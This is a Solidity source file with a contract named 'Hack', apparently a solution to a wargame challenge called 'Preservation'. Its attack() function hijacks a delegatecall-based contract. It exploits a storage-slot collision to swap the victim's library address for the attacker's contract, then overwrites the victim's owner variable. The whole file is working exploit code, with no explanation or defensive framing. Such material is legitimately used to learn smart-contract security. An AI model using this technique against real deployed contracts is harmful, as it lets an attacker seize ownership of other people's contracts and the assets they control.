// SPDX-License-Identifier: MIT

pragma solidity ^0.8;

interface IPreservation {
    function owner() external view returns (address);
    function setFirstTime(uint256) external;
}

contract Hack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(IPreservation preservationContract) external {
        preservationContract.setFirstTime(uint256(uint160(address(this))));
        preservationContract.setFirstTime(uint256(uint160(msg.sender)));
        require(preservationContract.owner() == msg.sender, "Failed");
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}